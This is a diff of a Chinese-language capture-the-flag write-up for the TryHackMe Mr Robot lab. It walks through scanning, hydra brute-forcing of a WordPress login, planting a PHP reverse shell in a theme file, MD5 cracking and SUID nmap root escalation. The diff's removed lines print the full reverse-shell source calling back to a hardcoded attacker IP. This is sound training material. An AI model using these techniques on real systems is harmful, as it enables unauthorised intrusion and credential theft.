@@ -1,30 +1,34 @@
 ## 概述
+
 來源: tryhackme
-題目: Mr Robot CTF 
+題目: Mr Robot CTF
 難度: medium
 網址: https://tryhackme.com/room/mrrobot
 
 ## 基本掃描
+
 ### nmap
+
 ```!=
-nmap -sV -sC -v 10.201.57.96 
+nmap -sV -sC -v 10.201.57.96
 ```
+
 ```!=
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 4d:4c:0e:71:11:ef:b7:17:65:75:b3:b1:c7:73:c9:fc (RSA)
 |   256 59:75:a0:14:b7:01:f2:d0:03:2b:0e:c6:bc:43:f9:73 (ECDSA)
 |_  256 00:2c:71:8b:1e:9a:4b:8d:6d:9d:00:91:86:e7:c5:c5 (ED25519)
 80/tcp  open  http     Apache httpd
 |_http-server-header: Apache
 |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Site doesn't have a title (text/html).
 443/tcp open  ssl/http Apache httpd
 |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 | ssl-cert: Subject: commonName=www.example.com
 | Issuer: commonName=www.example.com
@@ -41,8 +45,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### gobuster url
+
 ```!=
-└─$ gobuster dir -u http://10.201.57.96:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+└─$ gobuster dir -u http://10.201.57.96:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -66,40 +71,40 @@ Starting gobuster in directory enumeration mode
 /atom                 (Status: 200) [Size: 623]
 /audio                (Status: 301) [Size: 234] [--> http://10.201.57.96/audio/]
 /blog                 (Status: 301) [Size: 233] [--> http://10.201.57.96/blog/]
-/css                  (Status: 301) [Size: 232] [--> http://10.201.57.96/css/]                                                                          
-/dashboard            (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-admin/]                                                                    
+/css                  (Status: 301) [Size: 232] [--> http://10.201.57.96/css/]
+/dashboard            (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-admin/]
 /favicon.ico          (Status: 200) [Size: 0]
 /feed                 (Status: 200) [Size: 809]
-/image                (Status: 301) [Size: 0] [--> http://10.201.57.96:80/image/]                                                                       
-/images               (Status: 301) [Size: 235] [--> http://10.201.57.96/images/]                                                                       
+/image                (Status: 301) [Size: 0] [--> http://10.201.57.96:80/image/]
+/images               (Status: 301) [Size: 235] [--> http://10.201.57.96/images/]
 /index.html           (Status: 200) [Size: 1188]
 /index.php            (Status: 301) [Size: 0] [--> http://10.201.57.96:80/]
 /intro                (Status: 200) [Size: 516314]
-/js                   (Status: 301) [Size: 231] [--> http://10.201.57.96/js/]                                                                           
+/js                   (Status: 301) [Size: 231] [--> http://10.201.57.96/js/]
 /license              (Status: 200) [Size: 309]
-/login                (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-login.php]                                                                 
+/login                (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-login.php]
 /page1                (Status: 200) [Size: 8249]
 /phpmyadmin           (Status: 403) [Size: 94]
 /readme               (Status: 200) [Size: 64]
 /rdf                  (Status: 200) [Size: 813]
-/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.201.57.96:80/render/https:/www.google.com]                                        
+/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.201.57.96:80/render/https:/www.google.com]
 /robots               (Status: 200) [Size: 41]
 /robots.txt           (Status: 200) [Size: 41]
 /rss                  (Status: 200) [Size: 364]
 /rss2                 (Status: 200) [Size: 809]
 /sitemap              (Status: 200) [Size: 0]
 /sitemap.xml          (Status: 200) [Size: 0]
-/video                (Status: 301) [Size: 234] [--> http://10.201.57.96/video/]                                                                        
-/wp-admin             (Status: 301) [Size: 237] [--> http://10.201.57.96/wp-admin/]                                                                     
-/wp-content           (Status: 301) [Size: 239] [--> http://10.201.57.96/wp-content/]                                                                   
+/video                (Status: 301) [Size: 234] [--> http://10.201.57.96/video/]
+/wp-admin             (Status: 301) [Size: 237] [--> http://10.201.57.96/wp-admin/]
+/wp-content           (Status: 301) [Size: 239] [--> http://10.201.57.96/wp-content/]
 /wp-cron              (Status: 200) [Size: 0]
 /wp-config            (Status: 200) [Size: 0]
-/wp-includes          (Status: 301) [Size: 240] [--> http://10.201.57.96/wp-includes/]                                                                  
+/wp-includes          (Status: 301) [Size: 240] [--> http://10.201.57.96/wp-includes/]
 /wp-links-opml        (Status: 200) [Size: 227]
 /wp-load              (Status: 200) [Size: 0]
 /wp-login             (Status: 200) [Size: 2679]
 /wp-mail              (Status: 500) [Size: 3064]
-/wp-signup            (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-login.php?action=register]                                                 
+/wp-signup            (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-login.php?action=register]
 /wp-settings          (Status: 500) [Size: 0]
 /xmlrpc.php           (Status: 405) [Size: 42]
 /xmlrpc               (Status: 405) [Size: 42]
@@ -109,36 +114,45 @@ Finished
 ===============================================================
 ```
 
-## 第一組key
-### /robots洩漏資料
+## 第一組 key
+
+### /robots 洩漏資料
+
 訪問`http://10.201.57.96/robots`
+
 ```!=
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 ```
-發現`key-1-of-3.txt`訪問後得到第一組key
 
-## 第二組key
+發現`key-1-of-3.txt`訪問後得到第一組 key
+
+## 第二組 key
+
 ### 洩漏字典檔
+
 發現字典檔`fsocity.dic`
+
 ```!=
 ┌──(kali㉿kali)-[~/tryhackme/mrRobotCtf]
-└─$ wc -w fsocity.dic       
+└─$ wc -w fsocity.dic
 858160 fsocity.dic
 
 # 過濾一下重複單字
 ┌──(kali㉿kali)-[~/tryhackme/mrRobotCtf]
-└─$ sort fsocity.dic | uniq > fsocity_unique.dic 
+└─$ sort fsocity.dic | uniq > fsocity_unique.dic
 
 # 瘦身成功
 ┌──(kali㉿kali)-[~/tryhackme/mrRobotCtf]
-└─$ wc -w fsocity_unique.dic 
+└─$ wc -w fsocity_unique.dic
 11451 fsocity_unique.dic
 ```
 
-### hydra暴力破解
+### hydra 暴力破解
+
 嘗試暴力破解取得有效帳號
+
 ```!=
 └─$ hydra -L fsocity_unique.dic -p test 10.201.57.96 \
     http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" \
@@ -160,6 +174,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 11:54:
 ```
 
 成功取得帳號 再來嘗試取得該密碼
+
 ```!=
 └─$ hydra -l elliot -P fsocity_unique.dic 10.201.57.96 \
     http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" \
@@ -171,220 +186,36 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 11:59:
 [DATA] attacking http-post-form://10.201.57.96:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect
 [STATUS] 1841.00 tries/min, 1841 tries in 00:01h, 9611 to do in 00:06h, 64 active
 [STATUS] 1834.33 tries/min, 5503 tries in 00:03h, 5949 to do in 00:04h, 64 active
-[80][http-post-form] host: 10.201.57.96   login: elliot   password: ER28-0652                                                                           
+[80][http-post-form] host: 10.201.57.96   login: elliot   password: ER28-0652
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 12:02:25
 ```
+
 登入成功
 ![image](https://hackmd.io/_uploads/BykvItVRgg.png)
 
-### 上傳php-reverse-shell.php
+### 上傳 php-reverse-shell.php
+
 到`Appearance`>`Editor`修改`404.php`
 內容參考
 `cat /usr/share/webshells/php/php-reverse-shell.php`
+或 [php-reverse-shell.php](/tryhackme/Challenges/MrRobotCTF/php-reverse-shell.php)
+上傳後監聽 PORT
+
 ```!=
-<?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '10.4.11.38';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
-
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
-if (function_exists('pcntl_fork')) {
-        // Fork and have the parent process exit
-        $pid = pcntl_fork();
-
-        if ($pid == -1) {
-                printit("ERROR: Can't fork");
-                exit(1);
-        }
-
-        if ($pid) {
-                exit(0);  // Parent exits
-        }
-
-        // Make the current process a session leader
-        // Will only succeed if we forked
-        if (posix_setsid() == -1) {
-                printit("Error: Can't setsid()");
-                exit(1);
-        }
-
-        $daemon = 1;
-} else {
-        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-}
-
-// Change to a safe directory
-chdir("/");
-
-// Remove any umask we inherited
-umask(0);
-
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-        printit("$errstr ($errno)");
-        exit(1);
-}
-
-// Spawn shell process
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
-
-$process = proc_open($shell, $descriptorspec, $pipes);
-
-if (!is_resource($process)) {
-        printit("ERROR: Can't spawn shell");
-        exit(1);
-}
-
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
-
-printit("Successfully opened reverse shell to $ip:$port");
-
-while (1) {
-        // Check for end of TCP connection
-        if (feof($sock)) {
-                printit("ERROR: Shell connection terminated");
-                break;
-        }
-
-        // Check for end of STDOUT
-        if (feof($pipes[1])) {
-                printit("ERROR: Shell process terminated");
-                break;
-        }
-
-        // Wait until a command is end down $sock, or some
-        // command output is available on STDOUT or STDERR
-        $read_a = array($sock, $pipes[1], $pipes[2]);
-        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-        // If we can read from the TCP socket, send
-        // data to process's STDIN
-        if (in_array($sock, $read_a)) {
-                if ($debug) printit("SOCK READ");
-                $input = fread($sock, $chunk_size);
-                if ($debug) printit("SOCK: $input");
-                fwrite($pipes[0], $input);
-        }
-
-        // If we can read from the process's STDOUT
-        // send data down tcp connection
-        if (in_array($pipes[1], $read_a)) {
-                if ($debug) printit("STDOUT READ");
-                $input = fread($pipes[1], $chunk_size);
-                if ($debug) printit("STDOUT: $input");
-                fwrite($sock, $input);
-        }
-
-        // If we can read from the process's STDERR
-        // send data down tcp connection
-        if (in_array($pipes[2], $read_a)) {
-                if ($debug) printit("STDERR READ");
-                $input = fread($pipes[2], $chunk_size);
-                if ($debug) printit("STDERR: $input");
-                fwrite($sock, $input);
-        }
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
-        if (!$daemon) {
-                print "$string\n";
-        }
-}
-
-?> 
-```
-上傳後監聽PORT
-```!=
-└─$ nc -nvlp 1234                      
+└─$ nc -nvlp 1234
 listening on [any] 1234 ...
 ```
+
 訪問
 `http://10.201.57.96/wp-content/themes/twentyfifteen/404.php`
+
 > `twentyfifteen`是在`Appearance`>`Themes`隨便挑一個
 
-取得shell
+取得 shell
+
 ```!=
-└─$ nc -nvlp 1234                      
+└─$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.4.11.38] from (UNKNOWN) [10.201.57.96] 33274
 Linux ip-10-201-57-96 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
@@ -396,12 +227,15 @@ $ id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
 
-穩定shell
+穩定 shell
+
 ```!=
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 daemon@ip-10-201-57-96:/$
 ```
-發現key但沒有權限
+
+發現 key 但沒有權限
+
 ```!=
 daemon@ip-10-201-57-96:/home/robot$ ls
 ls
@@ -410,7 +244,9 @@ daemon@ip-10-201-57-96:/home/robot$ cat key-2-of-3.txt
 cat key-2-of-3.txt
 cat: key-2-of-3.txt: Permission denied
 ```
+
 確認後發現需要`robot`權限
+
 ```!=
 daemon@ip-10-201-57-96:/home/robot$ ls -la
 ls -la
@@ -420,42 +256,47 @@ drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
 ```
+
 找到疑似`robot`的密碼加密檔
+
 ```!=
 daemon@ip-10-201-57-96:/home/robot$ cat password.raw-md5
 cat password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
-確認加密方式 
+確認加密方式
+
 ```!=
 └─$ hashid c3fcd3d76192e4007dfb496cca67e13b
 Analyzing 'c3fcd3d76192e4007dfb496cca67e13b'
-[+] MD2 
-[+] MD5 
-[+] MD4 
-[+] Double MD5 
-[+] LM 
-[+] RIPEMD-128 
-[+] Haval-128 
-[+] Tiger-128 
-[+] Skein-256(128) 
-[+] Skein-512(128) 
-[+] Lotus Notes/Domino 5 
-[+] Skype 
-[+] Snefru-128 
-[+] NTLM 
-[+] Domain Cached Credentials 
-[+] Domain Cached Credentials 2 
-[+] DNSSEC(NSEC3) 
-[+] RAdmin v2.x 
+[+] MD2
+[+] MD5
+[+] MD4
+[+] Double MD5
+[+] LM
+[+] RIPEMD-128
+[+] Haval-128
+[+] Tiger-128
+[+] Skein-256(128)
+[+] Skein-512(128)
+[+] Lotus Notes/Domino 5
+[+] Skype
+[+] Snefru-128
+[+] NTLM
+[+] Domain Cached Credentials
+[+] Domain Cached Credentials 2
+[+] DNSSEC(NSEC3)
+[+] RAdmin v2.x
 ```
 
-### md5解密
-應該是md5加密
+### md5 解密
+
+應該是 md5 加密
 嘗試破解
+
 ```!=
-└─$ hashcat -m 0 -a 0 robot_hash /usr/share/wordlists/rockyou.txt 
+└─$ hashcat -m 0 -a 0 robot_hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -495,7 +336,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 c3fcd3d76192e4007dfb496cca67e13b:ab...yz
-                                                          
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 0 (MD5)
@@ -518,7 +359,9 @@ Started: Tue Oct 21 12:25:00 2025
 Stopped: Tue Oct 21 12:25:03 2025
 
 ```
+
 成功取得密碼 並登入成功
+
 ```!=
 daemon@ip-10-201-57-96:/home/robot$ su robot
 su robot
@@ -528,12 +371,14 @@ $ id
 id
 uid=1002(robot) gid=1002(robot) groups=1002(robot)
 ```
-取得第二組key
+
+取得第二組 key
+
 ```!=
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-robot@ip-10-201-57-96:~$ 
+robot@ip-10-201-57-96:~$
 robot@ip-10-201-57-96:~$ ls
 ls
 key-2-of-3.txt  password.raw-md5
@@ -544,7 +389,8 @@ cat key-2-of-3.txt
 
 ## 提權
 
-### 查看s權限的入口
+### 查看 s 權限的入口
+
 ```!=
 robot@ip-10-201-57-96:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
 find / -perm -4000 -type f 2>/dev/null
@@ -566,7 +412,9 @@ find / -perm -4000 -type f 2>/dev/null
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
+
 詳細版本
+
 ```!=
 robot@ip-10-201-57-96:/home/ubuntu$ find / -perm -u=s -type f 2>/dev/null -ls
 find / -perm -u=s -type f 2>/dev/null -ls
@@ -589,17 +437,21 @@ find / -perm -u=s -type f 2>/dev/null -ls
    783960     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-### nmap提權
-嘗試從nmap下手先確認版本
+### nmap 提權
+
+嘗試從 nmap 下手先確認版本
 結果意外的直接進入互動(Interactive)模式
+
 ```!=
 robot@ip-10-201-57-96:/home/ubuntu$ /usr/local/bin/nmap --version
 /usr/local/bin/nmap --version
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
-nmap> 
+nmap>
 ```
-嘗試提權，成功取得root權限
+
+嘗試提權，成功取得 root 權限
+
 ```!=
 nmap> !bash
 !bash
@@ -607,7 +459,9 @@ root@ip-10-201-57-96:/home/ubuntu# id
 id
 uid=0(root) gid=0(root) groups=0(root),1002(robot)
 ```
-取得第三組key
+
+取得第三組 key
+
 ```!=
 root@ip-10-201-57-96:/home/ubuntu# cd /root/
 cd /root/
